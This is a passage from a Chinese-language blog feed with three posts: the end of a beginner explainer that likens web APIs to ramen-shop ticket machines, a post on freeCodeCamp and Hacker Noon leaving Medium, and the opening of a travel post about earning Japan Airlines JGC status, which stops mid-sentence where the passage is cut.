src="/img/ramen-and-api-6238437dc544/1__3lF872K1zSoYeNz5X2O6AA.jpeg"></p><p>阿民在五歲那年，意識到爸媽每天都辛苦地用紙本紀錄訂房資訊，於是從那天起下定決心，要成為資工系的學生，幫家裡寫一個管理訂房的網站，讓爸媽開心。</p><p>時間快轉到十幾年後，他順利地就讀了資工系，除了系上教的那些科目，他也透過自學學習到了網頁開發的技術，並且成功做出了一個民宿管理系統，取名為 MingBook.com，用來管理家裡所經營的民宿。</p><p>這套系統成功地幫他們節省了很多時間，而且電子化之後愛護地球，從此以後都不必用紙本記錄東西，只要在電腦上按幾個鍵就好，十分方便。</p><p>不過，還有另一個更重要的問題還沒被解決。</p><p>目前能訂房的方式只有兩個，一個是打電話，另一個是到 MingBook.com 的官網。換句話說，如果 SEO（Search Engine Optimization，搜尋引擎優化） 做得不好，大家在使用 Google 搜尋民宿的時候找不到這個網站，就沒有人知道這間民宿的存在了。</p><p>再這樣下去，訂單會愈來愈少，最後只能落得關門大吉的下場。阿民心想這樣不行，決定想一些方法來解決這個問題。而他能想到最快也最直接的方法，就是把房間上架到訂房網站。</p><p>對欸，如果上架到那些 a 開頭 b 開頭 h 開頭的訂房網站，不就會帶更多流量進來嗎？這樣大家就有更多管道可以來訂房間了，不再受限於電話跟民宿官網。</p><p>「喂？請問是某某知名訂房網站嗎？想請問一下我如果想把我們家的民宿在你們網站上架，應該要怎麼做？」阿民打了通電話，想說直接去詢問應該怎麼上架，會比較有效率點。</p><p>『主要就是兩個資訊，第一個是您要提供空房資訊，我們才能在網站上顯示。第二個是使用者下訂單之後，必須提供一個方法讓我們把訂單傳送到您那裡』</p><p>「這很簡單嘛，我們已經有訂房網站了，是我自己寫的。你只要去網站上面就可以看到空房資訊跟下訂單了」阿民心想原來這麼容易，當初寫的系統還真好用。</p><p>『抱歉，<strong>我們要的只有資料</strong>，如果您提供的是一個網站，那我們工程師必須寫爬蟲去解析畫面才能拿到資料。<strong>您必須提供 API 給我們喔</strong>，等你準備好 API 再到官網去填資料就好了，謝謝』</p><p>就這樣，客服掛上了電話，留下一臉錯愕的阿民：</p><blockquote><p>到…到底什麼是 API？</p></blockquote><h3 id="白話講解-API"><a href="#白話講解-API" class="headerlink" title="白話講解 API"></a>白話講解 API</h3><p>無論是明示或暗示，相信你在上面兩個故事都有注意到一些我特別強調的地方。我發現如果要從正面來講 API 會非常難講，於是我決定先從側面切入。</p><p>一般來說當我們提到 API，會是這樣子的場景：</p><blockquote><p>你 API 串好了沒？你還沒串的話資料拿不到欸</p></blockquote><blockquote><p>我要來串 Google 登入的 API，讓我的網站可以用 Google 登入</p></blockquote><blockquote><p>請提供一個空房資訊的 API，我們才能顯示在網頁上面…</p></blockquote><p>從以上對話可以看出 API 背後隱含了「交換資訊」的目的。換句話說，如果你今天一直是一個人單打獨鬥，自己做自己的，基本上就不太會有 API 這種事情。需要串 API，就代表你需要別人的<strong>資料</strong>，或者是別人需要你的<strong>資料</strong>。</p><p>這邊特別把「資料」兩個字 highlight 起來，就是因為 API 基本上只牽涉到資料的交換，這是很重要的一部分。就像是阿民跟訂房網站的對話一樣，雖然阿民在自家網站上已經有訂房資訊了，但那個是 HTML，抓下來只會是一堆 <code>&lt;div&gt;</code> 之類的標籤，不是「純粹的資訊」。</p><p>那純粹的資訊長什麼樣子？我們來看一下 GitHub 的 API，只要你在網址列輸入：<a href="https://api.github.com/users/aszx87410">https://api.github.com/users/aszx87410</a> 並按下 Enter，就可以看到這樣的資訊：</p><p><img src="/img/ramen-and-api-6238437dc544/1__Nv0AlmAGoNAMX6aYBMcN7w.png"></p><p>你的第一個直覺可能是：「這什麼看不懂的東西？」，但你仔細看，會發現內容其實你看得懂。例如說有一個 “location”: “Taipei, Taiwan”，大概猜得出來意思是「地點在台北」，而 “blog”: “<a href="https://medium.com/@hulitw%E2%80%9D">https://medium.com/@hulitw”</a> 也猜得出來是「blog 是這個網站」的意思。</p><p>上面這些就是「純粹的資料」，你可以拿到資料本身，而不是畫面。那什麼叫做畫面？這個就是畫面：</p><p><img src="/img/ramen-and-api-6238437dc544/1__hq5oD5nnc__8CIxARIVji5A.png"></p><p>在上圖的畫面中，我們一樣可以看到各式各樣的資訊，但這是因為我們是人。你如果拿給機器看，機器會跟你說：「維大力？義大利？」，不知道你在供三小。</p><p>那機器要看什麼？要看我們上面用 GitHub API 回傳的那些資訊，只有資料本身而沒有任何畫面，這才是機器想看而且讀得懂的格式。所以，API 只會回傳資料，而不是像上面這樣的畫面，這是很重要的一點。</p><p>舉個例子，很多公司雖然都有後台系統可以看訂單資料，但對於某些人來說，必須要加個輸出成 Excel sheet 的功能，把資料都輸出出來才行。為什麼？因為我要的不是「看資料」，而是資料本身。我要把資料拿去做分析或是在 Excel 上面跑一些公式計算，所以我只需要資料。</p><p>所以簡單來說，API 就是個拿來交換資料的東西。</p><p>為什麼訂房網站要阿民開放 API 出來？因為它需要民宿的空房資料。<br>應該怎麼樣才能在網站上用 Google 的登入功能？串 Google 的 API。<br>要怎樣才能用程式碼操控印表機？用印表機提供的 API，就可以操控它。</p><p>當我提到「串 API」的時候，背後指的就是：「我要你的資料」或是「你要我的資料」，不過講資料其實有點侷限，更好的說法是：「我要用你的某個功能」或是「我要讓你用我的某個功能」。</p><p>以 Google 登入 API 來說，我要串是因為「我想在我的網站上使用 Google 登入」，而 Google 「開放」出這個 API 是因為「Google 想讓其他網站都可以用 Google 帳號登入」。</p><p>這邊會特地把「開放」兩個字標出來，意思就是說 Google 沒有開放出來的功能，你就不能用。</p><p>咦，怎麼覺得這個概念跟開頭講的販賣機有點像？</p><h3 id="連結販賣機與民宿網站的例子"><a href="#連結販賣機與民宿網站的例子" class="headerlink" title="連結販賣機與民宿網站的例子"></a>連結販賣機與民宿網站的例子</h3><p>仔細想想，會發現餐券販賣機也是同樣的。</p><p>為什麼會有餐券販賣機？廢話，因為餐廳要賣東西啊，這樣才叫做餐廳，提供食物以換取報酬。餐廳要賣食物，所以提供而且<strong>只提供</strong>餐券販賣機這個介面讓使用者來使用。</p><p>為什麼在阿民的民宿網站必須提供 API 給訂房網站？其中一個原因是阿民不可能把房間資訊的資料庫直接給他們嘛，這樣子顧客資料就全都外洩了。所以透過 API，<strong>阿民可以自己決定什麼要對外開放</strong>。</p><p>這跟販賣機是一樣的，販賣機上的按鈕決定了你要賣什麼餐點給顧客。如果今天沒有販賣機沒有店員，你要讓消費者自己衝進廚房跟廚師說他要點甚麼，你的獨家配方都被看光了，你覺得有可能嗎？</p><p>顧客透過販賣機這個界面來點餐，就跟訂房網站透過 API 才存取阿民家的房間資訊是一樣的。這樣你大概可以理解為什麼 API 的重點是後面那個 I，Interface 了。</p><p>透過介面，可以把兩端串連起來，卻又讓兩端不會互相干擾。訂房網站看得到 MingBook.com 還剩幾間房間，卻看不到顧客資料。阿民可以知道訂房網站上面自己的訂單有哪些，可是沒辦法看到訂房網站其他民宿的訂單。</p><p>當阿民跟訂房網站合作的時候，彼此之間會有資料交換的需求。但兩方都不可能門戶大開，直接把後台與資料庫全部給對方看。這時候就需要 API，透過 API，來決定什麼該開放，而什麼又不該。開放的還可以覺得要開放到什麼程度。</p><p>所以，什麼是 API？為什麼我們需要用到 API？</p><p>當「雙方」需要交流的時候，就必須透過 API。而 API 就是一種…介面。聽起來很抽象，但希望上面的那一大堆例子讓你在說出「介面」這個詞的時候腦中會有一些畫面（至少把販賣機想起來吧）</p><h3 id="API-與-Web-API"><a href="#API-與-Web-API" class="headerlink" title="API 與 Web API"></a>API 與 Web API</h3><p>前面提到當雙方交流的時候就必須透過 API，我覺得這算是很廣義的定義了。今天當我在寫程式時，我如果需要存取檔案，我就必須透過作業系統提供的 API，才能存取到檔案。如果今天作業系統沒有給我這個 API，那我就存取不到。</p><p>上面我們提的這個是作業系統與程式語言這兩層之間的 API，但是在一般生活上的例子，我們講的 API 其實是「Web API」。</p><p>什麼意思呢？</p><p>今天阿民跟訂房網站要串接 API 來拿資料。阿民有阿民自己的網站，訂房網站也有，那今天要透過什麼在兩個網站之間傳遞資料？網路嘛！透過網路才能傳輸資訊。</p><p>而因為是透過網路，所以就被稱之為 Web API。你可以想成有很多種不同的 API，操控檔案的我們會叫它 File API，網路相關的叫 Web API，諸如此類的。就像是販賣機有很多種，賣餐券的叫餐券販賣機，賣飲料的叫飲料販賣機，但無論如何，它們全都是販賣機。</p><p>我們前面提到的那個網址：<a href="https://api.github.com/users/aszx87410">https://api.github.com/users/aszx87410</a>，它其實就是一個 Web API，你透過網路連到這個網址，就可以拿到使用者 aszx87410 的資訊。所以我們可以說：「GitHub 開放了使用者資料的 API」，只要是任何想要取得使用者相關資訊的人，都可以來串接這個 API。</p><p>所以呢，阿民其實只要如法炮製，提供一個類似的東西，並且把內容換成房間的資訊就好。背後的實作就是從資料庫把東西撈出來，然後按照一定格式輸出，就大功告成了。</p><p>當阿民把 API 做好並且在訂房網站上面填寫資料時，他必須提供什麼？第一個就是網址，代表說：「這個 API 在哪裡」，第二個則是文件，告訴對方這個 API 應該如何使用。</p><p>這就像販賣機一樣，店家必須告訴我販賣機在哪裡，我才知道去哪裡找它（好啦但通常都在門口），而販賣機上面通常也都會有說明文字，跟我說怎麼操作，否則複雜一點的我有可能不會用。</p><p>API 在哪裡（網址）、API 怎麼用（文件），這就是不可或缺的兩大主角。</p><h3 id="略過技術細節的-API-串接實戰"><a href="#略過技術細節的-API-串接實戰" class="headerlink" title="略過技術細節的 API  串接實戰"></a>略過技術細節的 API  串接實戰</h3><p>接著我們來簡單實戰一下如何串接 API，不過我們不會講到技術細節，只會講到大概要做什麼。如果想學會怎麼串接 Web API，你必須先知道什麼是 HTTP 以及它在做什麼，接著才是看 API 文件。在此篇文章中不打算講這些，所以會簡單帶過。</p><p>假設今天我想串接 Spotify 的 API 好了，想取得最新專輯資訊，我應該怎麼做呢？</p><p>首先，先透過 Google 搜尋：Spotify API，你會找到這個頁面：</p><p><img src="/img/ramen-and-api-6238437dc544/1__4zLa__HKVZEEuSIqOKcr43g.png"></p><p>直接開門見山就跟你說是 Web API，就知道我們是要透過網路來跟 Spotify 拿資料。在這頁面底下就會看到一些基本的說明之類的，但重點是上方導覽列有個 Reference，點下去之後可以看見所有的資訊：</p><p><img src="/img/ramen-and-api-6238437dc544/1__8crEnFK1KNxkteuYVo8R0A.png"></p><p>並且在左邊的導覽列中，可以看到 Browse 底下有個 Get a List of New Releases，看起來就是我們要的 API，再點下去可以看見介紹：</p><p><img src="/img/ramen-and-api-6238437dc544/1__43ZXLC2z14WEmd8____MyiVg.png"></p><p>除了這截圖以外，往下捲動還會有更多相關的資訊，而這就是一份完整的 API 文件，跟你說這個 API 在哪裡（<a href="https://api.spotify.com/v1/browse/new-releases">https://api.spotify.com/v1/browse/new-releases</a>）以及如何使用（傳什麼參數、回傳值是什麼等等）。</p><p>不過與 GitHub API 不同，當你點擊上面的網址時，會出現一個 No token provided 的錯誤，因為 Spotify 的 API 需要身份驗證，而我們沒有傳進去相對應的身份驗證，所以拿不到資料。</p><p>不過你在文件上面往下找可以看到範例輸出，就可以看見這個 API 會回傳的資料，的確是我們要的最新專輯相關資訊。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>API 是什麼？就是日本拉麵店賣餐券的販賣機（會一直強調拉麵店只是因為我第一次看到它是在拉麵店）。</p><h4 id="我要串接-API-來取得房間資訊"><a href="#我要串接-API-來取得房間資訊" class="headerlink" title="我要串接 API  來取得房間資訊"></a>我要串接 API  來取得房間資訊</h4><p>=&gt; 我要看販賣機來確定拉麵賣完沒</p><h4 id="訂房網站必須透過-API-來我的網站下訂單"><a href="#訂房網站必須透過-API-來我的網站下訂單" class="headerlink" title="訂房網站必須透過 API  來我的網站下訂單"></a>訂房網站必須透過 API  來我的網站下訂單</h4><p>=&gt; 顧客必須透過販賣機來我的餐廳點餐</p><h4 id="API-只給我-email-跟姓名，地址拿不到"><a href="#API-只給我-email-跟姓名，地址拿不到" class="headerlink" title="API 只給我 email 跟姓名，地址拿不到"></a>API 只給我 email 跟姓名，地址拿不到</h4><p>=&gt; 販賣機只讓我點拉麵，沒辦法不要蔥花</p><h4 id="API-壞了，怎麼文件上寫回傳使用者資訊，卻傳成訂單資訊？"><a href="#API-壞了，怎麼文件上寫回傳使用者資訊，卻傳成訂單資訊？" class="headerlink" title="API 壞了，怎麼文件上寫回傳使用者資訊，卻傳成訂單資訊？"></a>API 壞了，怎麼文件上寫回傳使用者資訊，卻傳成訂單資訊？</h4><p>=&gt; 販賣機壞了，怎麼按鈕上面寫醬油拉麵，餐券卻寫燒肉飯？</p><p>什麼是販賣機？</p><blockquote><p>是一台能讓顧客與餐廳雙方溝通的機器。</p></blockquote><p>什麼是 API？</p><blockquote><p>是一個能讓生產者與消費者雙方溝通的介面。</p></blockquote><p>希望看完這篇能夠增進你對 API 的理解，從此再也不害怕這個名詞。一看見 API 就會想到販賣機，就會想到拉麵，就會想到日本。</p><p>（結尾好想放個什麼機票或是拉麵的購買連結，就變成超展開的業配文了）</p><p>這篇文章預設的讀者是完全不懂程式的路人或是有點程式基礎的初心者，希望能夠讓他們更容易了解什麼是 API。文中所用的販賣機比喻並不一定能夠適用所有跟 API 相關的場合，但我想強調的重點只有一個，那就是 API 是能夠連接雙方的介面。</p><p>感謝我的學生們給我這篇文章的靈感，以後應該還會有這種給初學者看的技術文章，想持續關注的話可以 follow 一下。單純手癢想按按鈕也可以按個 follow，或是考慮一下關注 <a href="https://www.facebook.com/lidemytw/">Lidemy 粉絲專頁</a>。</p><p>想看更多文章可以參考我的 Medium 文章列表：<a href="https://aszx87410.github.io/blog/medium">https://aszx87410.github.io/blog/medium</a></p>]]></content>
      
      
      <categories>
          
          <category> 技術白話文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技術白話文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Medium 出走潮：freeCodeCamp 與 Hacker noon 相繼離開，為什麼？</title>
      <link href="/2019/06/05/freecodecamp-hackernoon-are-leaving-medium-1b7319d7a8a7/"/>
      <url>/2019/06/05/freecodecamp-hackernoon-are-leaving-medium-1b7319d7a8a7/</url>
      
        <content type="html"><![CDATA[<p>若你是平常有在關注程式相關的文章的人，你對於 <a href="https://www.freecodecamp.org/">freeCodeCamp</a> 跟 <a href="https://hackernoon.com/">Hacker noon</a> 這兩個組織應該不陌生。</p><p>前者是國外的非營利組織，宗旨是要幫助大家免費學習如何寫 code，網站上提供了許多的免費教學以及課程。後者是一個科技相關的 tech blog，上面有著許多的技術文章，任何人都可以去投稿（我也曾經想投過）。根據他們在前陣子<a href="https://www.startengine.com/hackernoon">群眾募資</a>時提供的資料，他們的流量是全世界前五千名，每個月有八百萬多的 pageview。</p><p>而 5&#x2F;27 時 freeCodeCamp 正式宣佈：<a href="https://www.freecodecamp.org/forum/t/we-just-moved-off-of-medium-and-onto-freecodecamp-news-heres-how-you-can-use-it/279929">We just moved off of Medium and onto freeCodeCamp News. Here’s how you can use it</a>。在 5&#x2F;30 時 Hacker Noon 也發表了這篇：<a href="https://hackernoon.com/about-removing-medium-from-hackernoon-com-7c72353ba6e">About Removing Medium from Hackernoon.com</a>。</p><p>總之呢，結論就是他們都要離開 Medium 了。</p><p>若是你在 Hacker News 上面搜尋這一週與 Medium 相關的文章，會發現要嘛就是教你怎麼搬家，要嘛就是跟你說誰誰誰要離開 Medium 了：</p><p><img src="/img/freecodecamp-hackernoon-are-leaving-medium-1b7319d7a8a7/1__ql3dFoiN90MZPUzG5Q5Y6g.png"></p><h3 id="freeCodeCamp-的離去"><a href="#freeCodeCamp-的離去" class="headerlink" title="freeCodeCamp 的離去"></a>freeCodeCamp 的離去</h3><p>在 freeCodeCamp 所發表的《<a href="https://www.freecodecamp.org/forum/t/we-just-moved-off-of-medium-and-onto-freecodecamp-news-heres-how-you-can-use-it/279929">We just moved off of Medium and onto freeCodeCamp News. Here’s how you can use it</a>》一文中，開頭就總結了離開 Medium 的原因：</p><blockquote><p><strong>1. We now have our own open source publishing platform where you can write about anything you want the developer community to know about.</strong></p></blockquote><blockquote><p><strong>2. Your audience will be bigger than ever.</strong></p></blockquote><blockquote><p><strong>3. No more popups or sign-in prompts. Readers can enjoy your articles without any fuss.</strong></p></blockquote><blockquote><p><strong>4. The transition has been a long one, and we’re still fixing quite a few bugs.</strong></p></blockquote><p>而內文裡面也有提到離開的原因之一，是因為最近 Medium 似乎在投資人的壓力之下想要更快速地 monetize，若是你的文章沒有放在付費牆（paywall）裡面，Medium 幾乎不會主動幫你推廣文章。</p><p>而這點其實也造成了使用者體驗的問題，就是上面所講到的「**No more popups or sign-in prompts. Readers can enjoy your articles without any fuss.**」，搬到新平台之後，看文章不會再有惱人的 popup 跳出來。</p><p>而且根據 <a href="https://news.ycombinator.com/item?id=20062690">freeCodeCamp</a> 的說法（這邊有更完整的報導：<a href="https://wptavern.com/freecodecamp-moves-off-of-medium-after-being-pressured-to-put-articles-behind-paywalls">FreeCodeCamp Moves Off of Medium after being Pressured to Put Articles Behind Paywalls</a>）：</p><blockquote><p>But over the past year Medium had become more aggressive toward us. They have pressured us to put our articles behind their paywalls. We refused. So they tried to buy us. (Which makes no sense. We’re a public charity.) We refused. Then they started threatening us with a lawyer.</p></blockquote><p>就是 Medium 變得愈來愈激進，要求 freeCodeCamp 把文章放到付費牆不成之後就提出想收購，再不成就威脅要找律師（不過我也不知道找律師要幹嘛？）</p><p>所以最後 freeCodeCamp 就離開了，然後搬到自己的新平台去。</p><p>但搬家的過程中也有一些問題，就如《<a href="https://dev.to/ben/i-m-concerned-with-the-move-that-freecodecamp-just-pulled-by-leaving-medium-io8">I’m concerned with the move that FreeCodeCamp just pulled by leaving Medium</a>》一文中所提出的一樣，當作者在 freeCodeCamp 的 Medium publication 上發表文章時，似乎只同意在這邊發表，你要把文章搬到 freeCodeCamp 新平台的時候應該也要徵求作者同意，而不是直接把文章就搬過去。</p><p>再來我們看一下 Hacker Noon 那邊的情形。</p><h3 id="Hacker-Noon-的離去"><a href="#Hacker-Noon-的離去" class="headerlink" title="Hacker Noon 的離去"></a>Hacker Noon 的離去</h3><p>這一篇：《<a href="https://hackernoon.com/about-removing-medium-from-hackernoon-com-7c72353ba6e">About Removing Medium from Hackernoon.com</a>》超級長，基本上是一段 podcast 訪問的逐字稿，但也把整件事情講得滿清楚的。</p><p>其實 Hacker Noon 這邊的事情發生得更早，早在 3&#x2F;11 的時候 Hacker Noon 就發表了這樣的聲明：</p><p><img src="/img/freecodecamp-hackernoon-are-leaving-medium-1b7319d7a8a7/1__q37B3oZ6XXOKjlBr7LHg__w.jpeg"></p><p>聲明基本上就是說他們過去三年間所發表的每一篇文章都是在「Hackernoon.com」上面，不是 Medium.com，他們只把 Medium 當成是一個 content management system（CMS）。</p><p>其實我看到這講法的時候覺得滿奇怪的，因為我不會把 Medium 當作是一個 CMS，而會當作是一個平台。儘管你建立了 publication，但這個 publication 還是建立在 Medium 這個平台之上。</p><p>WordPress 才是 CMS，你可以用 WordPress 建立出自己的網站或是 blog，但你沒辦法在你的 WordPress 上面看到其他人也用 WordPress 做出的內容，因為 WordPress 並不是一個平台。</p><p>然後就在 Hacker Noon 寄信給 contributor 的隔天，他們也收到了一封來自 Medium 的信：</p><blockquote><p>Medium sent an email to all contributors to Hacker Noon saying “Hacker Noon may appear to be an independent website, it is not. It is a container that exists on the <a href="https://t.co/oQhVpwhM1P?amp=1" title="http://Medium.com">Medium.com</a> infra, much like a Facebook page.”</p></blockquote><blockquote><p>Medium is bullying the very curators it courted.</p></blockquote><p>（來源：<a href="https://twitter.com/garrytan/status/1105311939066884096">https://twitter.com/garrytan/status/1105311939066884096</a>）</p><p>裡面說到 Hacker Noon 只是一個存在於 Medium.com 上的容器，就像是粉絲專頁一樣。不過收到這封信的這個推主滿氣的就是了。</p><p>我自己是不太能理解推主在氣的東西啦，有一則<a href="https://twitter.com/firasd/status/1105348530741235712">推特</a>我覺得把事件整理得滿詳細的：</p><blockquote><p>I totally disagree with this framing. So here’s the sequence of events:</p></blockquote><blockquote><ol><li>I publish an article on Medium</li></ol></blockquote><blockquote><ol start="2"><li>Hacker Noon requests that my article be included in their ‘publication’ on Medium. There is an understanding via Medium about what this means (ie. that I own my article and can post it to other publications as well.) I accept Hacker Noon’s request. I benefit because Hacker Noon puts my article in front of more eyeballs.</li></ol></blockquote><blockquote><ol start="3"><li>Hacker Noon decides they want to leave Medium. They send an email to contributors asking them to sign a new terms of service.</li></ol></blockquote><blockquote><ol start="4"><li>Medium emails the contributors and says: Let us clear up some confusion; Hacker Noon has no rights to your content unless you grant it to them.</li></ol></blockquote><blockquote><p>Why is Medium the bad guy here?</p></blockquote><p>（來源：<a href="https://news.ycombinator.com/item?id=19365695">https://news.ycombinator.com/item?id=19365695</a>）</p><p>問題似乎就是出在 Hacker Noon 寄給 contributor 的那封信，就跟我說的一樣，在信裡面不知道為什麼把 Medium 說成是一個 CMS，這樣就好像所有發表在 Hacker Noon 的文章都是他們的一樣，但其實文章還是發表在 Medium 上面，所以當 Hacker Noon 想要搬家的時候，應該要徵求一次作者的同意，而不能直接搬走。</p><p>Medium 後來寄的那封信看起來是要強調這一點，強調儘管你發表在 Hacker Noon 這個 Publication，文章的權利依然屬於你自己而不是屬於 Publication。</p><p>最後我們也來看一下 Hacker Noon 想搬家的理由：</p><p><img src="/img/freecodecamp-hackernoon-are-leaving-medium-1b7319d7a8a7/1__do__pwDLMqg122OYZYBM__rw.jpeg"></p><p>簡單來說就是 Medium 原本允許這些 Publication 賺錢（上面寫說 using promotions，但我不是很懂這是什麼意思），但前陣子不允許了，所以 Publication 就斷了唯一的收入來源；再者，Medium 開始在 Publication 上面放廣告。</p><p>（上面第一點提到 Medium 不再 support 像他們這樣的 curators，不知道這邊的 support 是什麼意思？）</p><h3 id="平台的好與壞"><a href="#平台的好與壞" class="headerlink" title="平台的好與壞"></a>平台的好與壞</h3><p>無論你在 Medium 上面把部落格經營的如何，你始終是在這個平台上面。</p><p>你擁有了一套好用的編輯系統，免去了自己架站的煩惱，還能獲得平台本身的流量（雖然只有一點），但壞處就是一但這個平台做了什麼改變，你是完全沒辦法抵抗的。</p><p>今天 Medium 開始放廣告，你不能說不；假設 Medium 強制要你把文章放進付費牆，你也不能說不，因為這是 Medium 的主場，你只是個客人。</p><p>其實我們都知道這件事，所以我覺得平台跟使用者的信任很重要。我繼續在 Medium 上面寫東西，是因為我相信 Medium 不會做出如此不顧使用者感受的事（像是強制放廣告之類的），若是哪天這個信任破滅了，就沒有繼續待在這個平台的理由了。</p><p>隨著這兩個流量極大的部落格的離去，我又開始思考了自架部落格這一條路。自架的好處這篇寫得很詳細了：《<a href="https://medium.com/@dan_abramov/why-my-new-blog-isnt-on-medium-3b280282fbae">Why My New Blog Isn’t on Medium</a>，而這篇《<a href="https://www.webdistortion.com/2019/05/16/can-we-all-please-stop-using-medium-now/">Can we all please stop using Medium now?</a>》則是更激進一點：</p><blockquote><p>Medium is cancer. A <a href="https://www.webdistortion.com/2015/10/13/is-medium-just-another-trojan-horse-social-platform/">trojan horse</a>. It’s Facebook. But for blogging. A walled garden behind which all your favourite content lives, and yet you are forced to login via their shitty UI, or worse still pay for access.</p></blockquote><blockquote><p>……(中間省略)</p></blockquote><blockquote><p>So why is everyone still publishing on it? For what? More eyeballs? More attention? More reach?</p></blockquote><blockquote><p>Balls to that. If only one of you read this I’ll be happy. At least I own my own platform and I’m not being controlled by some monolithic publishing giant that can do <a href="https://twitter.com/JoshuaRowe11/status/1128859059099062272">whatever they want</a> and <a href="http://www.webdistortion.com/wp-content/uploads/2019/05/Screenshot-2019-05-16-at-23.51.53.png">sell whatever advertising they please</a> <strong>ON YOUR HARD WORK</strong>.</p></blockquote><blockquote><p>Please. It’s 2019. Learn to market yourself and your content. Quit being lazy waiting for Medium to do it for you. <strong>OWN YOUR PLATFORM</strong>.</p></blockquote><p>當初會跑來 Medium 寫作而不是自架，其實圖的就是方便。不過以長期來看，比起方便，似乎更重要的是自主性。當你依靠平台的時候，就會被平台牽著走，從長期來看這並不是一件好事，而且當你在平台待越久之後你會越難走，因為你必須放棄的東西更多。</p><p>結論呢？</p><p>不知道，我還沒有結論。或許我還會再想一下，再看看是不是要一起出走，搬到一個自己的平台去。或乾脆自己寫一個部落格平台好了，順便當作 side project，就像 <a href="https://logdown.com/">logdown</a> 那樣。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非典型微 JGC 修行（JMB 水晶卡）之旅</title>
      <link href="/2019/06/01/jgc-and-jal-ctystal-862f2bb4af8b/"/>
      <url>/2019/06/01/jgc-and-jal-ctystal-862f2bb4af8b/</url>
      
        <content type="html"><![CDATA[<p>上個月我從 5&#x2F;8 去日本一直到 5&#x2F;31 回來，在那邊待了三個禮拜。而這次的日本之旅，其實不只是為了去那邊玩而已。</p><p>不囉唆，先上圖。</p><p><img src="/img/jgc-and-jal-ctystal-862f2bb4af8b/1__tFiqsID5W4vS2itmvx6QDg.jpeg"></p><p>是的，在日本的 24 天內，我搭了 17 次的日本國內線，去了羽田機場、新千歲機場、青森機場、福岡機場、花卷機場、仙台機場、伊丹機場、三澤機場以及石垣島機場。</p><blockquote><p>這是三小，為什麼你要這樣飛？</p></blockquote><p>就讓我來跟大家介紹一下為什麼要這樣飛。為了要介紹，我們要先從航空公司的會員制度開始講起。</p><h3 id="普通人拿到也沒用的-VIP"><a href="#普通人拿到也沒用的-VIP" class="headerlink" title="普通人拿到也沒用的 VIP"></a>普通人拿到也沒用的 VIP</h3><p>大家都知道搭飛機的時候可以累積哩程，而每間航空公司都有自己的哩程計畫。當你飛行的哩程累積到一定程度之後，可以拿到航空公司的會員卡，也就是 VIP，通常會有不同的等級，愈高的等級能夠享受到的福利就愈多，通常包括：</p><ol><li>免費進航空公司的貴賓室</li><li>優先登機</li><li>優先行李</li><li>優先選位</li><li>退改票的手續費優惠</li></ol><p>但是，對我這種一年飛個沒幾次又不是商務客的人來說，就算拿到了會員卡也沒什麼用，因為通常一兩年之後就會失效了。為了讓會員資格能夠繼續維持，必須要每一兩年都飛足夠長的距離，而這種行為就叫<strong>保級</strong>，你要保持那個等級。</p><p>為了享有那些額外的福利，必須付出的成本對普通人來說太高了，而且不是可持續的，所以通常不會有那種不常飛的人為了成為會員而專門去飛。</p><p>可是在眾多航空公司裡面，有一間不一樣。</p><p>你猜到了，就是日本航空。</p><h3 id="日航的兩大優勢"><a href="#日航的兩大優勢" class="headerlink" title="日航的兩大優勢"></a>日航的兩大優勢</h3><p>日本航空不同的地方在於兩個優勢：取得成本低以及保級容易。</p><h4 id="保級容易"><a href="#保級容易" class="headerlink" title="保級容易"></a>保級容易</h4><p>我們先來看一下日本航空的會員計劃長什麼樣子：</p><p><img src="/img/jgc-and-jal-ctystal-862f2bb4af8b/1__G0QR2adCExQFDBtctgD02w.jpeg"></p><p>大概解釋一下，左邊那欄是一般的會員，而你在左邊飛到 50000 點 fly on points（以下簡稱 FOP） 之後可以拿到 JMB 藍寶石卡，並且獲邀進入 JAL 全球俱樂部（簡稱 JGC，Japan Global Club）。</p><p>那進入 JGC 之後有什麼好處呢？在<a href="https://www.tw.jal.co.jp/twl/zhtw/jalmile/flyon/status_conditions.html#tabs">官網</a>的地方還有一條規則：</p><blockquote><p>會員加入 JGC 後，將會保有其 JMB FLY ON 會員等級，此等級為根據前一年參與的航班搭乘活動決定。沒有 FLY ON 等級的 JGC 會員會獲得 oneworld 藍寶石卡等級。</p></blockquote><p>大家在搭飛機的時候應該多少都有聽過幾個名詞，例如說寰宇一家（oneworld）、星空聯盟（STAR ALLIANCE）或是天合聯盟（SkyTeam）之類的，這三大聯盟就是由許多航空公司組成。而日本航空所在的寰宇一家，底下還有：卡達航空、美國航空、英國航空與國泰航空等等。</p><p>當你拿到底下其中一間公司的會員時，在同樣聯盟底下的航空公司通常也能夠享受到相似的福利（但有些不行，要看航空公司規定）。</p><p>這是日本航空官網的圖片：</p><p><img src="/img/jgc-and-jal-ctystal-862f2bb4af8b/1__IIabWLXBlDRuey4NsqQZ4w.png"></p><p>所以，為什麼我會說保級容易？</p><p>因為一但你加入了 JGC（累積到 50000 FOP）之後， 就算你一趟都不飛，你還是可以擁有一張 oneworld 的藍寶石卡！不過要注意的是 JGC 要收年費，一年 5000 哩，不過日航提供 JGC 會員每一年的第一趟航班 3000 哩的獎勵，所以每年只要買日航機票去日本一兩趟就把年費抵掉了！這對常去日本的台灣人來說根本不是問題。</p><p>所以呢，當你飛到 50000 FOP 成為 JGC 會員之後，在<strong>制度沒有改變的前提</strong>之下，你等於是拿到了一張半永久性的航空公司會員卡！</p><p>那寰宇一家的藍寶石可以幹嘛呢？我們看一下<a href="https://www.cathaypacific.com/cx/zh_TW/travel-information/oneworld/frequent-flyer-benefits.html">國泰航空</a>網頁上的截圖，注意中間就好了，中間是藍寶石的福利：</p><p><img src="/img/jgc-and-jal-ctystal-862f2bb4af8b/1__AHTaapVKKjIledSq67h7Uw.png"></p><p>優先選位、優先候補、優先 check-in（商務艙櫃檯）、優先登機、貴賓室（可帶一位）與額外行李。簡單來說，就跟你搭商務艙沒兩樣。</p><p>一但擁有了這個會員資格，你就可以買著小資族的經濟艙機票，然後享受各種商務艙的福利。雖然在飛機上還是坐經濟艙，但至少在上飛機前跟下飛機後都能夠有商務艙的體驗，這其實也是很不錯的。</p><p>除了保級容易，還有另一個重點。</p><h4 id="取得成本低"><a href="#取得成本低" class="headerlink" title="取得成本低"></a>取得成本低</h4><p>好，只要拿到 50000 的 FOP 就行了吧！那到底什麼是 